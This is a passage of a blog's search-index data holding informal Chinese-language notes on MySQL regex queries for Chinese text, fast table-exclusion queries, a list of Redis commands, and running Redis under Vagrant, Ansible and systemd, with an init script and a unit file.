","date":"2020-02-20","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-MySQL-%E5%81%9A%E6%AD%A3%E8%A6%8F%E5%8C%96-REGEXP-%E5%92%8C-%E6%9F%A5%E8%A9%A2%E5%90%AB%E6%9C%89%E4%B8%AD%E6%96%87%E5%AD%97%E4%B8%B2%E6%96%B9%E6%B3%95/:2:0","tags":["mysql","regex"],"title":"使用 MySQL 做正規化 (REGEXP) 和 查詢含有中文字串方法","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-MySQL-%E5%81%9A%E6%AD%A3%E8%A6%8F%E5%8C%96-REGEXP-%E5%92%8C-%E6%9F%A5%E8%A9%A2%E5%90%AB%E6%9C%89%E4%B8%AD%E6%96%87%E5%AD%97%E4%B8%B2%E6%96%B9%E6%B3%95/"},{"categories":["SQL"],"content":"使用正規化 mysql\u003e SELECT v -\u003e FROM -\u003e ( -\u003e SELECT ‘sql server是微软开发的数据库管理系统’ AS v UNION ALL -\u003e SELECT ‘C-123456789’ AS v UNION ALL -\u003e SELECT ‘MySQL是一个开源的数据库管理系统’ AS v UNION ALL -\u003e SELECT ‘sdalfkj’ -\u003e )t -\u003e WHERE v REGEXP ‘[吖-座]’=1; +————————————–+ | v | +————————————–+ | sql server是微软开发的数据库管理系统 | | MySQL是一个开源的数据库管理系统 | +————————————–+ 2 rows in set (0.03 sec) ———————————————— 版权声明：本文为CSDN博主「不想长大啊」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。 原文链接：https://blog.csdn.net/sqlserverdiscovery/article/details/50443042 ","date":"2020-02-20","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-MySQL-%E5%81%9A%E6%AD%A3%E8%A6%8F%E5%8C%96-REGEXP-%E5%92%8C-%E6%9F%A5%E8%A9%A2%E5%90%AB%E6%9C%89%E4%B8%AD%E6%96%87%E5%AD%97%E4%B8%B2%E6%96%B9%E6%B3%95/:2:1","tags":["mysql","regex"],"title":"使用 MySQL 做正規化 (REGEXP) 和 查詢含有中文字串方法","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-MySQL-%E5%81%9A%E6%AD%A3%E8%A6%8F%E5%8C%96-REGEXP-%E5%92%8C-%E6%9F%A5%E8%A9%A2%E5%90%AB%E6%9C%89%E4%B8%AD%E6%96%87%E5%AD%97%E4%B8%B2%E6%96%B9%E6%B3%95/"},{"categories":["SQL"],"content":"length和char_length SELECT length(\"你好\"),char_length(\"你好\"); 長度不一樣就是含有非英文字!! ","date":"2020-02-20","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-MySQL-%E5%81%9A%E6%AD%A3%E8%A6%8F%E5%8C%96-REGEXP-%E5%92%8C-%E6%9F%A5%E8%A9%A2%E5%90%AB%E6%9C%89%E4%B8%AD%E6%96%87%E5%AD%97%E4%B8%B2%E6%96%B9%E6%B3%95/:2:2","tags":["mysql","regex"],"title":"使用 MySQL 做正規化 (REGEXP) 和 查詢含有中文字串方法","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-MySQL-%E5%81%9A%E6%AD%A3%E8%A6%8F%E5%8C%96-REGEXP-%E5%92%8C-%E6%9F%A5%E8%A9%A2%E5%90%AB%E6%9C%89%E4%B8%AD%E6%96%87%E5%AD%97%E4%B8%B2%E6%96%B9%E6%B3%95/"},{"categories":["SQL"],"content":"其他小記 【MySQL编程你也行】MySQL 识别是否是中文字符的方法_数据库_SQL Server探索-CSDN博客 » MySQL 两种识别是否有中文字符的方法 Unicode 编码相关 - 简书 SELECT 'ALL I NEED IS YOU の' REGEXP '^[[:\u003c:]]ALL I NEED IS YOU[[:\u003e:]] *((-.+)|([\\[].+[\\]])|([【].+[】])|([\\(].+[\\)])|([一-龥]+))$' oracle查詢欄位是否含有中文 - IT閱讀 ","date":"2020-02-20","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-MySQL-%E5%81%9A%E6%AD%A3%E8%A6%8F%E5%8C%96-REGEXP-%E5%92%8C-%E6%9F%A5%E8%A9%A2%E5%90%AB%E6%9C%89%E4%B8%AD%E6%96%87%E5%AD%97%E4%B8%B2%E6%96%B9%E6%B3%95/:3:0","tags":["mysql","regex"],"title":"使用 MySQL 做正規化 (REGEXP) 和 查詢含有中文字串方法","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-MySQL-%E5%81%9A%E6%AD%A3%E8%A6%8F%E5%8C%96-REGEXP-%E5%92%8C-%E6%9F%A5%E8%A9%A2%E5%90%AB%E6%9C%89%E4%B8%AD%E6%96%87%E5%AD%97%E4%B8%B2%E6%96%B9%E6%B3%95/"},{"categories":["SQL"],"content":"最近需求需要A表過濾B表 但是資料量非常大 處理時間非常久 ","date":"2020-02-19","objectID":"/blog/posts/%E5%A4%A7%E9%87%8FA%E8%A1%A8%E6%8E%92%E9%99%A4%E7%89%B9%E5%AE%9AB%E8%A1%A8-id-%E6%8E%92%E9%99%A4%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98/:0:0","tags":["mysql","sql"],"title":"大量A表排除特定B表 id 排除方法小記","uri":"/blog/posts/%E5%A4%A7%E9%87%8FA%E8%A1%A8%E6%8E%92%E9%99%A4%E7%89%B9%E5%AE%9AB%E8%A1%A8-id-%E6%8E%92%E9%99%A4%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98/"},{"categories":["SQL"],"content":"刪除方法得到結果 SELECT id FROM A LEFT JOIN B ON A.id = B.id WHERE B.id is null -- 執行非常久 -- 後來想嘗試用刪除資料看看結果，資料表都是暫時的 DELETE FROM A WHERE A.id IN (SELECT id FROM B) -- 執行非常久 DELETE a FROM A a INNER JOIN B b ON a.id = b.id -- 執行非常快 之前有紀錄SQL UPDATE 和 DELETE 趴配 JOIN 方法 | 程式狂想筆記 最後我使用上面方式解決這個方法 ","date":"2020-02-19","objectID":"/blog/posts/%E5%A4%A7%E9%87%8FA%E8%A1%A8%E6%8E%92%E9%99%A4%E7%89%B9%E5%AE%9AB%E8%A1%A8-id-%E6%8E%92%E9%99%A4%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98/:1:0","tags":["mysql","sql"],"title":"大量A表排除特定B表 id 排除方法小記","uri":"/blog/posts/%E5%A4%A7%E9%87%8FA%E8%A1%A8%E6%8E%92%E9%99%A4%E7%89%B9%E5%AE%9AB%E8%A1%A8-id-%E6%8E%92%E9%99%A4%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98/"},{"categories":["SQL"],"content":"使用 NOT EXISTS 其實以前就有聽過 EXISTS 效能是不錯的 剛好爬文看到LEFT JOIN / IS NULL vs. NOT IN vs. NOT EXISTS: nullable columns at EXPLAIN EXTENDED 看到使用 NOT EXISTS 還滿不錯的 但是做 count(distinct) 還是很慢 group by 也不快 SELECT id FROM A LEFT JOIN B ON A.id = B.id WHERE B.id is null 又空想到好的方式在做筆記 ","date":"2020-02-19","objectID":"/blog/posts/%E5%A4%A7%E9%87%8FA%E8%A1%A8%E6%8E%92%E9%99%A4%E7%89%B9%E5%AE%9AB%E8%A1%A8-id-%E6%8E%92%E9%99%A4%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98/:2:0","tags":["mysql","sql"],"title":"大量A表排除特定B表 id 排除方法小記","uri":"/blog/posts/%E5%A4%A7%E9%87%8FA%E8%A1%A8%E6%8E%92%E9%99%A4%E7%89%B9%E5%AE%9AB%E8%A1%A8-id-%E6%8E%92%E9%99%A4%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98/"},{"categories":["SQL"],"content":"可以在探討方法 ","date":"2020-02-19","objectID":"/blog/posts/%E5%A4%A7%E9%87%8FA%E8%A1%A8%E6%8E%92%E9%99%A4%E7%89%B9%E5%AE%9AB%E8%A1%A8-id-%E6%8E%92%E9%99%A4%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98/:3:0","tags":["mysql","sql"],"title":"大量A表排除特定B表 id 排除方法小記","uri":"/blog/posts/%E5%A4%A7%E9%87%8FA%E8%A1%A8%E6%8E%92%E9%99%A4%E7%89%B9%E5%AE%9AB%E8%A1%A8-id-%E6%8E%92%E9%99%A4%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98/"},{"categories":["SQL"],"content":"pandas Python之使用Pandas庫實現MySQL資料庫的讀寫 | 程式前沿 Pandas 加载数据的I/O性能比较 - This is Robert Lexis. [Pandas]一个Pandas VS MySQL SQL 的性能对比 - FlyML ","date":"2020-02-19","objectID":"/blog/posts/%E5%A4%A7%E9%87%8FA%E8%A1%A8%E6%8E%92%E9%99%A4%E7%89%B9%E5%AE%9AB%E8%A1%A8-id-%E6%8E%92%E9%99%A4%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98/:3:1","tags":["mysql","sql"],"title":"大量A表排除特定B表 id 排除方法小記","uri":"/blog/posts/%E5%A4%A7%E9%87%8FA%E8%A1%A8%E6%8E%92%E9%99%A4%E7%89%B9%E5%AE%9AB%E8%A1%A8-id-%E6%8E%92%E9%99%A4%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98/"},{"categories":["SQL"],"content":"SQL LEFT JOIN / IS NULL vs. NOT IN vs. NOT EXISTS: nullable columns at EXPLAIN EXTENDED SQL好文分享 - 十步完全理解 SQL | 程式狂想筆記 經典：十步完全理解 SQL-知識星球 2020-03-05 通過使用EXISTS，Oracle會首先檢查主查詢，然後執行子查詢直到它找到第一個匹配項，這就節省了時間。Oracle在執行IN子查詢時，首先執行子查詢，並將獲得的結果列表存放在一個加了索引的臨時表中。在執行子查詢之前，系統先將主查詢掛起，待子查詢執行完畢，存放在臨時表中以後再執行主查詢。這也就是使用EXISTS比使用IN通常查詢速度快的原因 SQL中EXISTS與IN的效率問題 - IT閱讀 通常 exists 子查詢是查到有資料才會出來 這邊要特別注意 ","date":"2020-02-19","objectID":"/blog/posts/%E5%A4%A7%E9%87%8FA%E8%A1%A8%E6%8E%92%E9%99%A4%E7%89%B9%E5%AE%9AB%E8%A1%A8-id-%E6%8E%92%E9%99%A4%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98/:3:2","tags":["mysql","sql"],"title":"大量A表排除特定B表 id 排除方法小記","uri":"/blog/posts/%E5%A4%A7%E9%87%8FA%E8%A1%A8%E6%8E%92%E9%99%A4%E7%89%B9%E5%AE%9AB%E8%A1%A8-id-%E6%8E%92%E9%99%A4%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98/"},{"categories":["SQL"],"content":"這篇只記錄，尚未測試 ","date":"2020-02-19","objectID":"/blog/posts/mysqldump-%E5%8C%AF%E5%87%BA-CSV-%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98/:0:0","tags":["mysql","sql","csv"],"title":"mysqldump  匯出 CSV 方法小記","uri":"/blog/posts/mysqldump-%E5%8C%AF%E5%87%BA-CSV-%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98/"},{"categories":["SQL"],"content":"secure_file_priv 利用mysqldump命令导出为csv格式文件 - Adrian·Ding - 博客园 ","date":"2020-02-19","objectID":"/blog/posts/mysqldump-%E5%8C%AF%E5%87%BA-CSV-%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98/:1:0","tags":["mysql","sql","csv"],"title":"mysqldump  匯出 CSV 方法小記","uri":"/blog/posts/mysqldump-%E5%8C%AF%E5%87%BA-CSV-%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98/"},{"categories":["SQL"],"content":"csvdump manticorp/CSVDump: A fast, effective and reliable tool for dumping CSV files into a MySQL database. bobby96333/csvdump: remote dump data from mysql 有查到這兩個，感覺都不錯用 ","date":"2020-02-19","objectID":"/blog/posts/mysqldump-%E5%8C%AF%E5%87%BA-CSV-%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98/:2:0","tags":["mysql","sql","csv"],"title":"mysqldump  匯出 CSV 方法小記","uri":"/blog/posts/mysqldump-%E5%8C%AF%E5%87%BA-CSV-%E6%96%B9%E6%B3%95%E5%B0%8F%E8%A8%98/"},{"categories":["Redis"],"content":"常常專案使用 redis 但並沒有深入了解 因為 Redis 一般看範例就知道怎麼使用了 真的非常簡單 但我覺得用那麼多次 沒深入了解不是很好 這篇整理一下 ","date":"2020-02-17","objectID":"/blog/posts/Redis-%E5%B0%8F%E8%A8%98/:0:0","tags":["redis"],"title":"Redis 小記","uri":"/blog/posts/Redis-%E5%B0%8F%E8%A8%98/"},{"categories":["Redis"],"content":"安裝 上一篇是用 ansible 安裝 redis 這篇就不做了… 其個更快的話可以用 apt install redis-server ","date":"2020-02-17","objectID":"/blog/posts/Redis-%E5%B0%8F%E8%A8%98/:1:0","tags":["redis"],"title":"Redis 小記","uri":"/blog/posts/Redis-%E5%B0%8F%E8%A8%98/"},{"categories":["Redis"],"content":"Redis 一般常用類型 String (最大可存 512 MB) Hash List Map Sorted Map(zmap) ","date":"2020-02-17","objectID":"/blog/posts/Redis-%E5%B0%8F%E8%A8%98/:2:0","tags":["redis"],"title":"Redis 小記","uri":"/blog/posts/Redis-%E5%B0%8F%E8%A8%98/"},{"categories":["Redis"],"content":"一般常用指令 ","date":"2020-02-17","objectID":"/blog/posts/Redis-%E5%B0%8F%E8%A8%98/:3:0","tags":["redis"],"title":"Redis 小記","uri":"/blog/posts/Redis-%E5%B0%8F%E8%A8%98/"},{"categories":["Redis"],"content":"keys * 一般線上不會用這個指令，好像會有阻塞的可能。 ","date":"2020-02-17","objectID":"/blog/posts/Redis-%E5%B0%8F%E8%A8%98/:3:1","tags":["redis"],"title":"Redis 小記","uri":"/blog/posts/Redis-%E5%B0%8F%E8%A8%98/"},{"categories":["Redis"],"content":"dbsize 回傳 key 的數量。 ","date":"2020-02-17","objectID":"/blog/posts/Redis-%E5%B0%8F%E8%A8%98/:3:2","tags":["redis"],"title":"Redis 小記","uri":"/blog/posts/Redis-%E5%B0%8F%E8%A8%98/"},{"categories":["Redis"],"content":"exists 查詢 key 是否存在。 return 1 存在，0 不存在 ","date":"2020-02-17","objectID":"/blog/posts/Redis-%E5%B0%8F%E8%A8%98/:3:3","tags":["redis"],"title":"Redis 小記","uri":"/blog/posts/Redis-%E5%B0%8F%E8%A8%98/"},{"categories":["Redis"],"content":"del 刪除 key ","date":"2020-02-17","objectID":"/blog/posts/Redis-%E5%B0%8F%E8%A8%98/:3:4","tags":["redis"],"title":"Redis 小記","uri":"/blog/posts/Redis-%E5%B0%8F%E8%A8%98/"},{"categories":["Redis"],"content":"expire 設定 key 結束時間 ","date":"2020-02-17","objectID":"/blog/posts/Redis-%E5%B0%8F%E8%A8%98/:3:5","tags":["redis"],"title":"Redis 小記","uri":"/blog/posts/Redis-%E5%B0%8F%E8%A8%98/"},{"categories":["Redis"],"content":"ttl 查看 key 剩餘時間 -1 沒有限制 -2 沒有 key 存在 ","date":"2020-02-17","objectID":"/blog/posts/Redis-%E5%B0%8F%E8%A8%98/:3:6","tags":["redis"],"title":"Redis 小記","uri":"/blog/posts/Redis-%E5%B0%8F%E8%A8%98/"},{"categories":["Redis"],"content":"type 查看 key 的類型 ","date":"2020-02-17","objectID":"/blog/posts/Redis-%E5%B0%8F%E8%A8%98/:3:7","tags":["redis"],"title":"Redis 小記","uri":"/blog/posts/Redis-%E5%B0%8F%E8%A8%98/"},{"categories":["Redis"],"content":"incr 會把 key 的 value 加 1 這個是 redis 適合做計數器 ","date":"2020-02-17","objectID":"/blog/posts/Redis-%E5%B0%8F%E8%A8%98/:3:8","tags":["redis"],"title":"Redis 小記","uri":"/blog/posts/Redis-%E5%B0%8F%E8%A8%98/"},{"categories":["Redis"],"content":"類型相關指令 ","date":"2020-02-17","objectID":"/blog/posts/Redis-%E5%B0%8F%E8%A8%98/:4:0","tags":["redis"],"title":"Redis 小記","uri":"/blog/posts/Redis-%E5%B0%8F%E8%A8%98/"},{"categories":["Redis"],"content":"String set set 四個 option setex setex key second value 跟 set key value expire key second 一樣動作 set key value ex second setnx key 不存在才做設定值 mset mset key1 value1 key2 value2 可以多個設定值 一般 set n次set時間=n次網路時間+n次命令 但是 mset 只需要一次網路時間 mset時間=1次網路時間+n次命令 mget 跟 mset 與 set 關係差不多 如上。 找不到會回傳 nil(null) append append key value 會在 value 值後面加入新 value 值 就算不存在也不會有問題 strlen key 的 value 長度 沒資料的話，回傳 0 getset getset key value 回傳值是舊值 ","date":"2020-02-17","objectID":"/blog/posts/Redis-%E5%B0%8F%E8%A8%98/:4:1","tags":["redis"],"title":"Redis 小記","uri":"/blog/posts/Redis-%E5%B0%8F%E8%A8%98/"},{"categories":["Redis"],"content":"Hash hset hset key field value hset user:1 name josh hget hget key field hget user:1 name hsetnx hsetnx key field value hdel hdel 刪除 key 的 field hlen hlen 抓取 key 的長度 hkeys 這邊 hkeys 跟 key 完全沒有關係 列出 key 裡面的 field hmset,hmget hmset key field1 value1 field2 value2 … hexist hmget key field1 filed2 … hvals hvals key hgetall hgetall 會把所有field,value抓出來。 老實說我還不知道這個能做什麼? 會阻塞，可以使用 hscan 代替 hstrlen 抓取 key field 長度 hincrby hincrby key field 1 回傳累加值 hincrbyfloat hincrbyfloat key filed 回傳累加值 ","date":"2020-02-17","objectID":"/blog/posts/Redis-%E5%B0%8F%E8%A8%98/:4:2","tags":["redis"],"title":"Redis 小記","uri":"/blog/posts/Redis-%E5%B0%8F%E8%A8%98/"},{"categories":["Redis"],"content":"List lpush lpush key value l =\u003e left 在 list 左邊加入 value rpush r =\u003e right 同上，但家在右邊 list lpop l =\u003e left 移除(拿出) 左邊 list 的 value rpop 同上，是右邊 llen llen list(key) lrem lrem list(key) count value 根據參數 count 的值，移除列表中與參數 value 相等的元素。 count 的值可以是以下幾種： count \u003e 0 : 從表頭開始向表尾搜索，移除與 value 相等的元素，數量為 count 。 count \u003c 0 : 從表尾開始向表頭搜索，移除與 value 相等的元素，數量為 count 的絕對值。 count = 0 : 移除表中所有與 value 相等的值。 LREM key count value — Redis 命令参考 lrange 返回列表 key 中指定區間內的元素，區間以偏移量 start 和 stop 指定。 下標(index)參數 start 和 stop 都以 0 為底，也就是說，以 0 表示列表的第一個元素，以 1 表示列表的第二個元素，以此類推。 你也可以使用負數下標，以 -1 表示列表的最後一個元素， -2 表示列表的倒數第二個元素，以此類推。 LRANGE key start stop — Redis 命令參考 lindex lindex key index 回傳 list 的位置 value值 brpop 阻塞 rpop brpush 阻塞 rpush 總整理 新增: rpush lpush linsert 查詢: lrange lindex llen 刪除: lpop rpop lrem ltrim 修改: lset 阻塞動作: blpop brpop Message Queue 消息對列 是用 lpush,brpop 但跟 lpush ,rpop 不能做嗎? 後來發現 rpop 不會阻塞 在這邊程式用 while 迴圈 CPU 一定會爆表(吃很多資源) ","date":"2020-02-17","objectID":"/blog/posts/Redis-%E5%B0%8F%E8%A8%98/:4:3","tags":["redis"],"title":"Redis 小記","uri":"/blog/posts/Redis-%E5%B0%8F%E8%A8%98/"},{"categories":["Redis"],"content":"Set sset sset key element … srem srem key element scard 算出 set 個數 sismember set is member ? 判斷 set 裡面有沒有 指定的值 spop 移除一個 set 的值 回傳移除的值 srandmember srandmember key [count] 隨機回傳 set 的 member(資料) smember smember key 回傳 set 所有值(member) PS: smembers 和 lrange,hgetall 都會造成阻塞可能性。通常會用 sscan 替代 set 運算集 sinter (交集) sinter key [key …] sunion (聯集) sunion key [key …] sdiff (差集) sdiff key [key …] 集合存在… sinterstore destination key [key …] sunionstore destination key [key …] sdiffstore destination key [key …] ","date":"2020-02-17","objectID":"/blog/posts/Redis-%E5%B0%8F%E8%A8%98/:4:4","tags":["redis"],"title":"Redis 小記","uri":"/blog/posts/Redis-%E5%B0%8F%E8%A8%98/"},{"categories":["Redis"],"content":"sorted set zadd sadd key [option] score member [score member …] option nx: member 必須不存在 xx: member 必須存在 CH：修改從加入新的元素，以改變元件的總數（CH是改變的縮寫）的數目的返回值. 更改的元素是添加的新元素以及已為其更新分數的現有元素. 因此，命令行中指定的具有與過去相同分數的元素將不計算在內. 注意：通常， ZADD的返回值僅計算添加的新元素的數量.這個還不是很懂 ZADD – Redis 中文文檔教程 INCR: 數值累加 zcard 查詢 zset 個數 zsocre 這個很重要。沒有 zget zscore key member 得到設定分數 排名 zrank zrank key member 查詢 member 排名 由小到大 zrevrank zrevrank 排名(倒敘) 由大到小 zrem zrem key member [member …] 刪除 member zincrby zincrby key increment member 給 member 增加 score zrange,zrevrange 由小到大 zrange key start end [withscores] 由大到小 zrevrange key start end [withscores] ex: zrange zset 0 100 withscores 是同時返回 score 分數 zrangebyscore, zrevrangebyscore zrangebyscore key min max [withscores] [limit offset count] zrevrangebyscore key min max [withscores] [limit offset count] 指定範圍返回 member -inf,+inf =\u003e 無限小,無限大 小括號 ( 大於 ex: zrangebyscore user:rank (200 +inf withscores zcount zcount key min max 抓取分數區間的 member 個數 zremrangebyrank , zremrangebyscore zremrangebyrank key start end 刪除 rank 排名(0開始) ex: zremrangebyrank user:rank 0 3 zremrangebyscore key min max zremrangebyscore user:rank (250 +inf 集運算 交集 zinterstore destination numkeys key [key …] [weights weight [weight …]] [aggregate sum|min|max] weight 權重 aggregate 交集後做的 score 動作。預設是 sum 并集 zunionstore destination numkeys key [key …] [weights weight [weight …]] [aggregate sum|min|max] zset 小結論 set 跟 zset 指令差非常多 一般常用在 排行榜上面 有在思考資料會一直存在 redis ? 經過 Google 一翻，正常會把資料回傳到 MySQL PHP+Redis 实例【一】点赞 + 热度 上篇 - H-大叔 - 博客园 PHP+Redis 实例【一】点赞 + 热度 下篇 - H-大叔 - 博客园 更多文章 使用MySQL、Redis解决排行榜问题 - 簡書 千万用户排名设计 - 知乎 云风的 BLOG: 谈谈陌陌争霸在数据库方面踩过的坑(排行榜篇) ","date":"2020-02-17","objectID":"/blog/posts/Redis-%E5%B0%8F%E8%A8%98/:4:5","tags":["redis"],"title":"Redis 小記","uri":"/blog/posts/Redis-%E5%B0%8F%E8%A8%98/"},{"categories":["Redis"],"content":"搜尋一些 ","date":"2020-02-17","objectID":"/blog/posts/Redis-%E5%B0%8F%E8%A8%98/:5:0","tags":["redis"],"title":"Redis 小記","uri":"/blog/posts/Redis-%E5%B0%8F%E8%A8%98/"},{"categories":["Redis"],"content":"redis 學習路線 網路上找到的圖 ","date":"2020-02-17","objectID":"/blog/posts/Redis-%E5%B0%8F%E8%A8%98/:5:1","tags":["redis"],"title":"Redis 小記","uri":"/blog/posts/Redis-%E5%B0%8F%E8%A8%98/"},{"categories":["Redis"],"content":"一些找網路文章 Redis 应用场景汇总 | LearnKu 终身编程者的知识社区 php - redis使用list做消息队列,为什么推送用lpush,而消费用的是brpop? - SegmentFault 思否 redis专题16 数据持久化实践 | 一线攻城狮 Redis SCAN的使用 - 静中细思的博客 | Kingnet Blog 阿里云Redis开发规范-云栖社区-阿里云 Jedis常见异常汇总-云栖社区-阿里云 ","date":"2020-02-17","objectID":"/blog/posts/Redis-%E5%B0%8F%E8%A8%98/:5:2","tags":["redis"],"title":"Redis 小記","uri":"/blog/posts/Redis-%E5%B0%8F%E8%A8%98/"},{"categories":["Vagrant"],"content":"常常我們需要做布署安裝 多台可能需要 最近看到 vagrant 可以搭配 ansible 使用 網路上隨便找一個範例小記 意外發現 /var/run 一些程式設定方法 ","date":"2020-02-15","objectID":"/blog/posts/vagrant-%E6%90%AD%E9%85%8D%E4%BD%BF%E7%94%A8-ansible-%E5%92%8C-docker-%E6%9E%B6%E8%A8%AD-redis-%E5%B0%8F%E8%A8%98/:0:0","tags":["vagrant","docker","ansible"],"title":"vagrant 搭配使用 ansible 和 docker 架設 redis 小記","uri":"/blog/posts/vagrant-%E6%90%AD%E9%85%8D%E4%BD%BF%E7%94%A8-ansible-%E5%92%8C-docker-%E6%9E%B6%E8%A8%AD-redis-%E5%B0%8F%E8%A8%98/"},{"categories":["Vagrant"],"content":"vagrant 使用 ansible 安裝 redis mikeblum/redis-playbook: Ansible playbook for deploying, securing, and optimizing a Redis instance git clone https://github.com/mikeblum/redis-playbook.git cd redis-playbook # image 可以改成用過的 vagrant up 這時候 redis 都是可以用的 但我發現 vagrant reload 重開機後 redis 竟然開不起來 ","date":"2020-02-15","objectID":"/blog/posts/vagrant-%E6%90%AD%E9%85%8D%E4%BD%BF%E7%94%A8-ansible-%E5%92%8C-docker-%E6%9E%B6%E8%A8%AD-redis-%E5%B0%8F%E8%A8%98/:1:0","tags":["vagrant","docker","ansible"],"title":"vagrant 搭配使用 ansible 和 docker 架設 redis 小記","uri":"/blog/posts/vagrant-%E6%90%AD%E9%85%8D%E4%BD%BF%E7%94%A8-ansible-%E5%92%8C-docker-%E6%9E%B6%E8%A8%AD-redis-%E5%B0%8F%E8%A8%98/"},{"categories":["Vagrant"],"content":"/var/run 引發 redis 無法啟動 /var/run 裡面的 redis 重開機竟然就不見了 經過 Google 發現由於 ubuntu 預設 /var/run 是用 tmpfs 所以重開機資料就不會在 但我發現裡面有 docker ,mysqld…，權限也不是 root 這又是從哪裡來的呢? 後來追查發現 /etc/init/ 裡面 docker.conf 和 mysql.conf 有做產生檔案改權限相關動作 題外話不過那 /var/log 是怎麼改的? 這也是不錯的問題 但是我嘗試使用 apt install redis 發現 /etc/init 沒有我要的 後來發現 /etc/init.d/ 裡面有相關 redis 設定 ########################### #chkconfig: 2345 10 90 #description: Start and Stop redis PATH=/usr/local/bin:/sbin:/usr/bin:/bin REDISPORT=6379 EXEC=/usr/local/bin/redis-server REDIS_CLI=/usr/local/bin/redis-cli ##判断redis是否启动了 PIDFILE=/var/run/redis_6379.pid CONF=\"/etc/redis.conf\" PASSWORD=$(cat $CONF|grep '^\\s*requirepass'|awk '{print $2}'|sed 's/\"//g') case \"$1\" in start) if [ -f $PIDFILE ] then echo \"$PIDFILE exists, process is already running or crashed\" else echo \"Starting Redis server...\" $EXEC $CONF fi if [ \"$?\"=\"0\" ] then echo \"Redis is running...\" fi ;; stop) if [ ! -f $PIDFILE ] then echo \"$PIDFILE does not exist, process is not running\" else PID=$(cat $PIDFILE) echo \"Stopping ...\" if [ -z $PASSWORD ] then $REDIS_CLI -p $REDISPORT shutdown else $REDIS_CLI -a $PASSWORD -p $REDISPORT shutdown fi #$REDIS_CLI -p $REDISPORT SHUTDOWN while [ -x ${PIDFILE} ] do echo \"Waiting for Redis to shutdown ...\" sleep 1 done echo \"Redis stopped\" fi ;; restart|force-reload) ${0} stop ${0} start ;; *) echo \"Usage: /etc/init.d/redis {start|stop|restart|force-reload}\" \u003e\u00262 exit 1 esac ############################## 我懶得從 VM 搬出來，參考Redis在Linux上的安装及相关配置 - 知乎 但就沒有專門給 systemctl 設定用的嗎? 還是有找到方法，但很多都沒有提到 是不是大部分 /var/run 沒有掛載到 tmpfs 上面?? [Unit] Description=Redis In-Memory Data Store After=network.target [Service] PermissionsStartOnly=true ExecStartPre=-/bin/mkdir -p /var/run/redis ExecStartPre=-/bin/chown redis.redis /var/run/redis #PIDFile=/var/run/redis_6379.pid 發現沒用也 User=redis Group=redis ExecStart=/usr/local/bin/redis-server /etc/redis/redis.conf ExecStop=/usr/local/bin/redis-cli shutdown Restart=always [Install] WantedBy=multi-user.target 上面 PIDFile 好像沒加也能正常跑( 可以看 /etc/redis/redis.conf 的 pidfile ) 主要上 /var/run/redis 資料夾需要建立，並且權限給 redis:redis 不過這個算是最佳解嗎? 我在這篇/var/run/redis_2323 directory cannot be created in systemd service · Issue #132 · DavidWittman/ansible-redis看到 最後解決方案Merge pull request #135 from DavidWittman/132-systemd-tmpfiles · DavidWittman/ansible-redis@9937b2e使用 /etc/tmpfiles.d 不過我看我現在 linux 系統沒有這個目錄 ","date":"2020-02-15","objectID":"/blog/posts/vagrant-%E6%90%AD%E9%85%8D%E4%BD%BF%E7%94%A8-ansible-%E5%92%8C-docker-%E6%9E%B6%E8%A8%AD-redis-%E5%B0%8F%E8%A8%98/:1:1","tags":["vagrant","docker","ansible"],"title":"vagrant 搭配使用 ansible 和 docker 架設 redis 小記","uri":"/blog/posts/vagrant-%E6%90%AD%E9%85%8D%E4%BD%BF%E7%94%A8-ansible-%E5%92%8C-docker-%E6%9E%B6%E8%A8%AD-redis-%E5%B0%8F%E8%A8%98/"},{"categories":["Vagrant"],"content":"/etc/tempfiles.d 最佳解法 systemd (正體中文) - ArchWiki /usr/lib/tmpfiles.d/ 和 /etc/tmpfiles.d/ 中的檔案描述了 systemd-tmpfiles 如何創建、清理、删除臨時檔案和目錄，這些檔案和目錄通常存放在 /run 和 /tmp 中。設定檔名稱為 /etc/tmpfiles.d/.conf。此處的配置能覆蓋 /usr/lib/tmpfiles.d/目錄中的同名配置。 臨時檔案通常和服務檔案同时提供，以生成守護程序需要的檔案和目錄。例如 Samba 服務需要目錄 /run/samba 存在並設置正確的權限位 Ubuntu 16.04 \u0008在 reboot 後保留 tmp 內的檔案 | Mr. 沙先生 我 Elementary OS 裡面 /etc/tmpfiles.d/ 沒有任何東西，/usr/lib/tmpfiles.d/ 底下有 不過正常應該是可以用的 只要在 playbook.yml 下面加 - name: create systemd tmpfiles configuration template: src=templates/tmpfiles_redis.conf.j2 dest=/etc/tmpfiles.d/redis.conf mode=0644 templates/tmpfiles_redis.conf.j2 d {{ redis_socket|dirname }} 0755 {{ redis_user }} {{ redis_group }} 就可以正常了 ","date":"2020-02-15","objectID":"/blog/posts/vagrant-%E6%90%AD%E9%85%8D%E4%BD%BF%E7%94%A8-ansible-%E5%92%8C-docker-%E6%9E%B6%E8%A8%AD-redis-%E5%B0%8F%E8%A8%98/:1:2","tags":["vagrant","docker","ansible"],"title":"vagrant 搭配使用 ansible 和 docker 架設 redis 